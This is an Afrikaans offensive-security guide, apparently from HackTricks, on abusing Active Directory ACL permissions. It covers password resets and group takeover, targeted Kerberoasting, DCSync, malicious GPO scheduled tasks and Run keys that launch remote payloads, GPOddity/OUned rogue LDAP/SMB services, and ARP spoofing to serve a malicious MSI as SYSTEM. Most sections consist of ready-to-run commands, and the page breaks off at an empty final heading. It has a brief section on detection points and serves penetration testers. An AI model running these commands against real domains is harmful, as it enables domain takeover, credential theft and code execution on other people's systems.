# Misbruik van Active Directory-ACL's/ACE's

{{#include ../../../banners/hacktricks-training.md}}

**Hierdie bladsy is hoofsaaklik 'n opsomming van die tegnieke uit** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **en** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Raadpleeg die oorspronklike artikels vir meer besonderhede.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

Vir misbruik van ACL's op geskrapte objekte en rekeningherlewing, sien [AD Recycle Bin reanimation](../privileged-groups-and-token-privileges.md#reanimating-a-deleted-account-through-delegated-acls).

## **GenericAll-regte op gebruiker**

Hierdie voorreg gee 'n aanvaller volle beheer oor 'n teiken se gebruikersrekening. Nadat die `GenericAll`-regte met die `Get-ObjectAcl`-opdrag bevestig is, kan 'n aanvaller:

- **Die teiken se wagwoord verander**: Met `net user <username> <password> /domain` kan die aanvaller die gebruiker se wagwoord terugstel.
- Vanaf Linux kan jy dieselfde oor SAMR met Samba `net rpc` doen:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **As die rekening gedeaktiveer is, verwyder die UAC-vlag**: `GenericAll` laat toe dat `userAccountControl` gewysig word. Vanaf Linux kan BloodyAD die `ACCOUNTDISABLE`-vlag verwyder:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Ken ’n SPN aan die gebruiker se rekening toe om dit kerberoastable te maak, en gebruik dan Rubeus en targetedKerberoast.py om die ticket-granting ticket (TGT)-hashes te onttrek en te probeer crack.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Deaktiveer voorafverifikasie vir die gebruiker, wat hul rekening kwesbaar maak vir ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Met `GenericAll` op ’n gebruiker kan jy ’n sertifikaatgebaseerde aanmeldbewys byvoeg en as daardie gebruiker verifieer sonder om hul wagwoord te verander. Sien:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll-regte op ’n groep**

Hierdie voorreg stel ’n aanvaller in staat om groeplidmaatskappe te manipuleer as hulle `GenericAll`-regte op ’n groep soos `Domain Admins` het. Nadat die aanvaller die groep se distinguished name met `Get-NetGroup` geïdentifiseer het, kan hulle:

- **Hulself by die Domain Admins-groep voeg**: Dit kan met direkte opdragte gedoen word, of met modules soos Active Directory of PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Vanuit Linux kan jy ook BloodyAD gebruik om jouself by willekeurige groepe te voeg wanneer jy GenericAll/Write-lidmaatskapregte daaroor het. As die teikengroep geneste is onder “Remote Management Users”, kry jy onmiddellik WinRM-toegang op gashere wat daardie groep erken:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write on Computer/User**

As jy hierdie voorregte op ’n rekenaarobjek of gebruikersrekening het, kan jy:

- **Kerberos Resource-based Constrained Delegation**: ’n rekenaarobjek oorneem.
- **Shadow Credentials**: Hierdie tegniek gebruik om ’n rekenaar- of gebruikersrekening na te boots deur die voorregte te misbruik om shadow credentials te skep.

## ’n Objek na OU-regte wat geërf word verskuif

’n Aanvalsroete kan **verskuifregte op ’n rekening** kombineer met **skryfregte wat van ’n bestemmings-OU geërf word**, selfs wanneer geen van die prinsipale aanvanklik die rekening se sensitiewe eienskappe kan wysig nie. Bevestig die bronobjek se verskuifregte en `CreateChild` op die bestemming, verskuif die objek en kontroleer dan weer die effektiewe DACL. Byvoorbeeld, powerview.py se `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` verskuif die gebruiker; ’n beheerde groep met geërfde `GenericWrite` op daardie OU kan dan ’n [shadow credential](shadow-credentials.md) byvoeg. Die verskuiwing skep nie op sigself die geërfde reg nie.<sup>[[18]](#references)</sup>

As jy `GenericAll` op ’n OU het, maar geen geskikte geërfde ACE nie, kan `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` een vir die afstammelinge daarvan byvoeg. Toets die teikenrekening afsonderlik: **AdminSDHolder-beskermde rekeninge het oorerwing gedeaktiveer**, dus kan ’n OU-ACE gewone gebruikers raak, maar nie ’n beskermde gebruiker nie. Sien [AdminSDHolder and SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group).<sup>[[18]](#references)</sup>

’n Afsonderlike misbruikroete bestaan wanneer ’n bevoorregte geskeduleerde skoonmaaks skrip OU’s kies op grond van ACE’s wat deur ’n aanvaller beïnvloed kan word, en dan `Set-ADObject -Clear adminCount` **en** `$acl.SetAccessRuleProtection($False, $False)` op hul afstammelinge uitvoer. As jy die OU-DACL kan wysig, ken die groep wat deur die skrip nagegaan word die vereiste `ExtendedRight`- of `GenericAll`-ACE toe; bevestig afsonderlik dat jy die taak kan uitvoer. Die bevoorregte taak kan dan oorerwing op ’n voorheen beskermde rekening herstel, sodat die OU-ACE toegepas kan word. Bevestig die presiese skrip, toestemming om dit te aktiveer en die resulterende DACL; die skoonmaak van `adminCount` alleen heraktiveer nie oorerwing nie, en SDProp kan rekeninge wat steeds in beskermde groepe is, weer beskerm.<sup>[[18]](#references)</sup>

## **WriteProperty op ’n groep**

As ’n gebruiker `WriteProperty`-regte op alle objekte vir ’n spesifieke groep het (bv. `Domain Admins`), kan die gebruiker:

- **Hulself by die Domain Admins-groep voeg**: Dit kan bereik word deur die `net user`- en `Add-NetGroupUser`-opdragte te kombineer en maak voorregte-eskalasie binne die domein moontlik.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-Membership) on Group**

Hierdie voorreg stel aanvallers in staat om hulself by spesifieke groepe, soos `Domain Admins`, te voeg deur opdragte te gebruik wat groeplidmaatskap direk manipuleer. Die volgende opdragreeks maak dit moontlik om hulself by te voeg:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

’n Soortgelyke voorreg stel aanvallers in staat om hulself direk by groepe te voeg deur groepseienskappe te wysig, mits hulle die `WriteProperty`-reg op daardie groepe het. Hierdie voorreg word soos volg bevestig en uitgevoer:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Die besit van die `ExtendedRight` op ’n gebruiker vir `User-Force-Change-Password` laat wagwoordterugstellings toe sonder dat die huidige wagwoord bekend is. Verifikasie van hierdie reg en die uitbuiting daarvan kan met PowerShell of alternatiewe opdragreëlnutsgoed gedoen word. Daar is verskeie maniere om ’n gebruiker se wagwoord terug te stel, waaronder interaktiewe sessies en eenreël-opdragte vir nie-interaktiewe omgewings. Die opdragte wissel van eenvoudige PowerShell-aanroepe tot die gebruik van `rpcclient` op Linux, wat die veelsydigheid van aanvallektorе demonstreer.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner op groep**

As ’n aanvaller ontdek dat hulle `WriteOwner`-regte oor ’n groep het, kan hulle die eienaarskap van die groep na hulself verander. Dit het veral ’n groot impak wanneer die betrokke groep `Domain Admins` is, aangesien verandering van die eienaarskap groter beheer oor groepkenmerke en lidmaatskap moontlik maak. Die proses behels dat die korrekte objek met `Get-ObjectAcl` geïdentifiseer word en dan `Set-DomainObjectOwner` gebruik word om die eienaar volgens SID of naam te verander.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite op gebruiker**

Hierdie toestemming stel ’n aanvaller in staat om gebruikereienskappe te wysig. Met spesifieke `GenericWrite`-toegang kan die aanvaller die gebruiker se aanmeldingskrippad verander om ’n kwaadwillige skrip uit te voer wanneer die gebruiker aanmeld. Dit word gedoen deur die `Set-ADObject`-opdrag te gebruik om die `scriptpath`-eienskap van die teikengebruiker op te dateer sodat dit na die aanvaller se skrip verwys.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

’n Nouer `WriteProperty` ACE wat tot die gebruiker se [`scriptPath`-kenmerk](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) beperk is, kan voldoende wees; `GenericWrite` is nie nodig nie. Kombineer daardie kenmerkreg met ’n skryfbare script in die domein se `SYSVOL\<domain>\scripts`- of `NETLOGON`-boom, en bepaal dan of die teikengebruiker waarskynlik sal aanmeld en die script sal bereik. Die script loop tydens aanmelding in daardie gebruiker se konteks. Gaan die effektiewe AD- en lêer-/deel-ACL’s afsonderlik na; ’n ooreenstemmende Allow ACE of ’n skryfbare gids alleen bewys nie dat die volledige pad bestaan nie.

## **GenericWrite on Group**

Met hierdie voorreg kan aanvallers groeplidmaatskap manipuleer, byvoorbeeld deur hulself of ander gebruikers by spesifieke groepe te voeg. Hierdie proses behels die skep van ’n credential object, die gebruik daarvan om gebruikers by ’n groep te voeg of daaruit te verwyder, en die verifikasie van die lidmaatskapveranderinge met PowerShell-opdragte.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Vanaf Linux kan Samba `net` lede byvoeg/verwyder wanneer jy `GenericWrite` op die groep het (nuttig wanneer PowerShell/RSAT nie beskikbaar is nie):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Om ’n AD-objek te besit en `WriteDACL`-voorregte daarop te hê, stel ’n aanvaller in staat om aan hulself `GenericAll`-voorregte oor die objek toe te ken. Dit word deur ADSI-manipulasie gedoen, wat volle beheer oor die objek en die vermoë om sy groep-lidmaatskappe te wysig moontlik maak. Tog bestaan daar beperkings wanneer hierdie voorregte met die Active Directory-module se `Set-Acl` / `Get-Acl`-cmdlets uitgebuit word.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Vinnige oorname met WriteDACL/WriteOwner (PowerView)

Wanneer jy `WriteOwner` en `WriteDacl` oor ’n gebruiker- of diensrekening het, kan jy volle beheer oorneem en die wagwoord met PowerView terugstel sonder om die ou wagwoord te ken:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Notas:
- Jy moet dalk eers die eienaar na jouself verander as jy net `WriteOwner` het:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Bevestig toegang met enige protokol (SMB/LDAP/RDP/WinRM) nadat die wagwoord teruggestel is.

## **Replikasie op die domein (DCSync)**

Die DCSync-aanval benut spesifieke replikasieregtes op die domein om ’n Domain Controller na te boots en data, insluitend gebruikersbewyse, te sinkroniseer. Hierdie kragtige tegniek vereis toestemmings soos `DS-Replication-Get-Changes`, wat aanvallers in staat stel om sensitiewe inligting uit die AD-omgewing te onttrek sonder direkte toegang tot ’n Domain Controller.<sup>[[5]](#references)</sup> [**Kom hier meer te wete oor die DCSync-aanval.**](../dcsync.md)

## GPO-delegering <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO-delegering

Gedelegeerde toegang om Group Policy Objects (GPOs) te bestuur, kan beduidende sekuriteitsrisiko’s inhou. Byvoorbeeld, as ’n gebruiker soos `offense\spotless` gedelegeerde GPO-bestuursregte kry, kan hulle voorregte soos **WriteProperty**, **WriteDacl** en **WriteOwner** hê. Hierdie toestemmings kan vir kwaadwillige doeleindes misbruik word, soos met PowerView geïdentifiseer: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumereer GPO-toestemmings

Om verkeerd opgestelde GPOs te identifiseer, kan PowerSploit se cmdlets saamgeketting word. Dit maak dit moontlik om GPOs te ontdek wat ’n spesifieke gebruiker mag bestuur: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Rekenaars waarop ’n gegewe beleid toegepas word**: Dit is moontlik om vas te stel op watter rekenaars ’n spesifieke GPO van toepassing is, wat help om die omvang van moontlike impak te verstaan. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Beleide wat op ’n gegewe rekenaar toegepas word**: Om te sien watter beleide op ’n spesifieke rekenaar toegepas word, kan opdragte soos `Get-DomainGPO` gebruik word.

**OU’s waarop ’n gegewe beleid toegepas word**: Organisatoriese eenhede (OU’s) wat deur ’n gegewe beleid geraak word, kan met `Get-DomainOU` geïdentifiseer word.

Jy kan ook die hulpmiddel [**GPOHound**](https://github.com/cogiceo/GPOHound) gebruik om GPOs te enumereer en probleme daarin te vind.

### Misbruik GPO - New-GPOImmediateTask

Verkeerd opgestelde GPOs kan uitgebuit word om kode uit te voer, byvoorbeeld deur ’n onmiddellike geskeduleerde taak te skep. Dit kan gebruik word om ’n gebruiker by die plaaslike administrateursgroep op geraakte masjiene te voeg, wat voorregte aansienlik verhoog:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Abuse GPO

Die GroupPolicy-module maak, indien geïnstalleer, dit moontlik om nuwe GPO's te skep en te koppel, en voorkeure soos registerwaardes in te stel om backdoors op geaffekteerde rekenaars uit te voer. Hierdie metode vereis dat die GPO opgedateer word en dat 'n gebruiker by die rekenaar aanmeld sodat dit uitgevoer kan word:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Misbruik GPO

SharpGPOAbuse bied ’n metode om bestaande GPO’s te misbruik deur take by te voeg of instellings te wysig, sonder dat nuwe GPO’s geskep hoef te word. Hierdie tool vereis dat bestaande GPO’s gewysig word, of dat RSAT-tools gebruik word om nuwes te skep voordat veranderinge toegepas word:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Forseer beleidsopdatering

GPO-opdaterings vind gewoonlik ongeveer elke 90 minute plaas. Om hierdie proses te bespoedig, veral nadat ’n verandering aangebring is, kan die opdrag `gpupdate /force` op die teikenrekenaar gebruik word om ’n onmiddellike beleidsopdatering af te dwing. Hierdie opdrag verseker dat enige wysigings aan GPOs toegepas word sonder om vir die volgende outomatiese opdateringsiklus te wag.

### Onder die kap

Wanneer die Scheduled Tasks vir ’n gegewe GPO, soos die `Misconfigured Policy`, ondersoek word, kan die byvoeging van take soos `evilTask` bevestig word. Hierdie take word geskep deur skrifte of opdragreëlnutsgoed wat daarop gemik is om stelselgedrag te verander of voorregte te eskaleer.

Die taak se struktuur, soos getoon in die XML-konfigurasielêer wat deur `New-GPOImmediateTask` gegenereer word, beskryf die besonderhede van die geskeduleerde taak — insluitend die opdrag wat uitgevoer moet word en die snellers daarvan. Hierdie lêer wys hoe geskeduleerde take binne GPOs gedefinieer en bestuur word, en bied ’n metode om arbitrêre opdragte of skrifte as deel van beleidsafdwinging uit te voer.

### Gebruikers en groepe

GPOs laat ook die manipulasie van gebruikers- en groeplidmaatskappe op teikenstelsels toe. Deur die Users and Groups-beleidlêers direk te wysig, kan aanvallers gebruikers by bevoorregte groepe voeg, soos die plaaslike `administrators`-groep. Dit is moontlik deur die delegering van GPO-bestuurstoestemmings, wat dit moontlik maak om beleidslêers te wysig en nuwe gebruikers in te sluit of groeplidmaatskappe te verander.

Die XML-konfigurasielêer vir Users and Groups beskryf hoe hierdie veranderinge geïmplementeer word. Deur inskrywings by hierdie lêer te voeg, kan spesifieke gebruikers verhoogde voorregte op geaffekteerde stelsels kry. Hierdie metode bied ’n direkte manier om voorregte deur GPO-manipulasie te eskaleer.

Vir sekuriteitsinstellings soos plaaslike groeplidmaatskap en gebruikersregte, moet die toegepaste GPO-template by `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` en die ACL van die `SecEdit`-gids ook ondersoek word. ’n Skryfbare gids of lêer is ’n leidraad vir verdere ondersoek: die effektiewe toegang tot die SYSVOL share, deny- en oorgeërfde ACLs, die Group Policy-container se toestemmings, beleidsomvang en kliëntverversing bepaal steeds of ’n verandering in werking kan tree. Lidmaatskap van ’n groep met die naam “GPO Managers” bewys op sigself nie dat wysigingsregte bestaan nie. [Microsoft beskryf hierdie template-pad en die skeiding tussen die Group Policy-container en -template.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Verder kan bykomende metodes om kode uit te voer of volharding te handhaaf, soos die gebruik van aanmeld-/afmeldskrifte, die wysiging van registersleutels vir outomatiese uitvoering, die installering van sagteware via .msi-lêers of die wysiging van dienskonfigurasies, ook oorweeg word. Hierdie tegnieke bied verskeie maniere om toegang te behou en teikenstelsels te beheer deur misbruik van GPOs.

### Herlei GPC/GPT-ophaling na geverifieerde skelm dienste

’n GPO bestaan uit ’n LDAP-**Group Policy Container (GPC)** met metadata en ’n SMB-gehoste **Group Policy Template (GPT)** met die beleidslêers. Tydens verfrissing volg die kliënt die container se `gPLink`, lees die verwysde GPC en sy `gPCFileSysPath`, en laai dan die GPT van daardie UNC-pad af. Gevolglik kan skryftoegang tot óf die GPC self óf die `gPLink` van ’n OU, Site of Domain omgeskakel word in bevoorregte beleidsverwerking.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Vergiftiging van `gPCFileSysPath` met GPOddity

As die beheerde prinsipaal die teiken-GPC kan skryf (direk of deur **NTLM relay to LDAP**), vervang `gPCFileSysPath` met ’n UNC-pad wat deur die aanvaller gehost word. [GPOddity](https://github.com/synacktiv/GPOddity) outomatiseer die LDAP-verandering en dien ’n kwaadwillige GPT op wat modulegebaseerde beleidslêers of ’n Immediate Task bevat wat die Group Policy-kliënt as `NT AUTHORITY\SYSTEM` uitvoer.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

’n Anonieme SMB share of een wat nie geloofsbriewe vereis nie, is nie voldoende op huidige Windows-kliënte nie: SMB Secure Negotiate vereis bewys dat verifikasie geslaag het. Die skelm diens moet dus die domeinidentiteit bekragtig, die SMB-sessiesleutel aflei en sy antwoorde korrek onderteken. Stel GPOddity in ingebedde modus op met ’n beheerde masjienrekening en sy dienssleutel, en kies dan ’n rekenaar- of gebruikerskant-lading in die `[COMMANDS]`-afdeling.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**User GPO-randgeval:** ná MS16-072 skep Windows steeds twee SMB2-sessies in dieselfde TCP-verbinding: die gebruikersessie lees `GPT.INI`, en daarna lees die rekenaarrekeningsessie effektiewe konfigurasie soos `ScheduledTasks.xml`. ’n Skelm bediener moet dus verifikasietoestand, sessiesleutels en ondertekeningsleutels volgens SMB2 `SessionId` indekseer, nie net volgens sok nie. Die Scapy-fork wat in GPOddity/OUned ingebed is, implementeer dit deur middel van `SMBStreamSocketMultiplexing` en ’n multiplexing-bewuste `SMBServer`; enkel-sessie-Impacket/Scapy-bedieners hergebruik andersins die verkeerde ondertekeningstoestand en misluk met gebruikersbeleide.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning met OUned

Met `WriteGPLink`, `GenericWrite` of ekwivalente beheer oor ’n OU, Site of Domain, kan ’n aanvaller ’n skakel byvoeg waarvan die GPC DN deur ’n aanvallerbeheerde LDAP-gasheer bedien word. Hierdie tegniek is oorspronklik deur Petros Koutroumpis aangebied; [OUned](https://github.com/synacktiv/OUned) outomatiseer die LDAP-skrywing en die kwaadwillige GPC/GPT-ketting.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Die slagoffer verifieer eers by die rogue LDAP-diens en ontvang ’n GPC waarvan `gPCFileSysPath` na die rogue SMB-diens wys; daarna verifieer dit by SMB en pas die verskafde GPT toe. OUned benodig dus ’n rekening met ’n LDAP SPN, ’n masjienrekening met ’n HOST SPN vir SMB (dieselfde masjienrekening kan albei vereistes dek), en DNS-resolusie of omgekeerde aanstuur wat poorte 389 en 445 na die operateur se gasheer stuur.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned se ingebedde Scapy LDAP-bediener valideer Kerberos/SPNEGO met die werklike beheerde dienssleutel en verskaf arbitrêre GPC-data vanuit JSON. Die leë JSON-sleutel stel rootDSE voor, `base64:`-voorvoegsels dui binêre waardes aan, en die bediener ondersteun add/delete/modify/search plus `BASE`-, `LEVEL`- en `SUBTREE`-soektogte; dit kan sonder beskerming, met integriteit of met vertroulikheid onderhandel. Dit maak die diens herbruikbaar wanneer ’n ander Windows-komponent ’n aanvallerbeheerde LDAP-verwysing volg, maar op geverifieerde LDAP aandring.<sup>[[15]](#references)</sup>

Moenie aanvaar dat die sinkronisering van ’n rekeningwagwoord na ’n dummy-domein elke Kerberos-sleutel reproduseer nie: RC4 word van die wagwoord afgelei, terwyl AES-string-to-key ook ’n sout gebruik wat van die hoofnaam se gasheernaam/domein afgelei word. Deur die werklike AES-sleutel van die rekening aan `KerberosSSP` te verskaf, vermy jy dat RC4 afgedwing word deur ’n waarneembare verandering aan die masjienrekening se selfskryfbare `msDS-SupportedEncryptionTypes`.<sup>[[15]](#references)</sup>

#### Opsporingspunte

Korreleer veranderinge aan `gPCFileSysPath` of `gPLink` met GPO-weergaweveranderinge en nuwe Immediate/Scheduled Task XML. Ondersoek skakels na onverwagte naamruimtekontekste, UNC-gashere buite die goedgekeurde DC/SYSVOL-stel, DNS-rekords wat masjienrekeningname herlei, LDAP/CIFS-dienst kaartjies vir ongewone masjienrekeninge, en `msDS-SupportedEncryptionTypes`-veranderinge wat RC4 aktiveer.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` oor ’n OU/domein laat jou toe om die `gPLink`-kenmerk van die teikenhouer te wysig en **’n bestaande GPO af te dwing** sonder om die GPO self te redigeer. Dit raak interessant wanneer die gekoppelde GPO reeds na afgeleë inhoud via **UNC-paaie** (`\\HOST\share\...`) verwys, omdat geverifieerde gebruikers **SYSVOL** kan lees en vanlyn na herbruikbare beleide kan soek.<sup>[[11]](#references)</sup>

Hoëvlakwerkvloei:

1. Gebruik BloodHound om ’n prinsipaal met `WriteGPLink` oor ’n OU te identifiseer en rekenaars/gebruikers binne daardie OU op te som.
2. Kloon `SYSVOL` met leesalleen-toegang en ontleed GPO’s om **Software Installation**, **skyfkarterings** (`Drives.xml`) en **aanmeld-/opstartskripte** te vind wat na UNC-paaie verwys.
3. Verkies beleide wat na ’n **direkte gasheernaam** verwys (byvoorbeeld `\\DC02\share\pkg.msi`) eerder as DFS/domeinnaamruimte-paaie, omdat gasheernaamgebaseerde paaie makliker met L2-spoofing herlei kan word.
4. Voeg die gekose GPO-GUID by die teiken-OU se `gPLink` sodat die slagoffer daardie reeds bestaande beleid verwerk.
5. ARP-spoof op dieselfde uitsaaidomein die UNC-gasheer en koppel sy IP-adres plaaslik (`ip addr add <target_ip>/32 dev <iface>`) sodat die slagoffer se SMB-verkeer jou gasheer bereik.
6. Bedien die verwagte pad/lêernaam vanaf ’n aanvaller se SMB-bediener (byvoorbeeld `smbserver.py`) en wag vir normale beleidsverwerking.

Voorbeeld van `SYSVOL`-insameling en GPO-korrelasie:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Koppel die bestaande GPO aan die teiken-OU:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

As die gekoppelde GPO ’n MSI vanaf ’n UNC-pad ontplooi, sal die kliënt dit tydens **rekenaaropstart** ophaal en as **`NT AUTHORITY\SYSTEM`** installeer. Deur die verwysde gasheer na te boots en ’n kwaadwillige MSI by **dieselfde share/pad/naam** aan te bied, kan jy `WriteGPLink` in kode-uitvoering as SYSTEM omskep **sonder om SYSVOL te wysig**.

Belangrike beperkings:

- **Tydsberekening is belangrik**: die nuwe skakel word tydens beleidsverversing opgemerk (gewoonlik elke ~90 minute), maar **Software Installation** word gewoonlik tydens **herlaai** geaktiveer.
- Windows Installer hou gewoonlik die ontplooiing met die pakket se **`ProductCode`** dop. As die produk reeds geïnstalleer is, kan die ontplooiing oorgeslaan word.
- Om te voorkom dat die installer dit verwerp, pas die kwaadwillige MSI aan sodat sy **`ProductCode`** en **`PackageCode`** ooreenstem met dié van die wettige pakket wat die GPO verwag.
- Ou `.aas`-advertensielêers kan in `SYSVOL` agterbly, so bevestig dat die ontplooiing steeds aktief lyk voordat jy daarop staatmaak.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

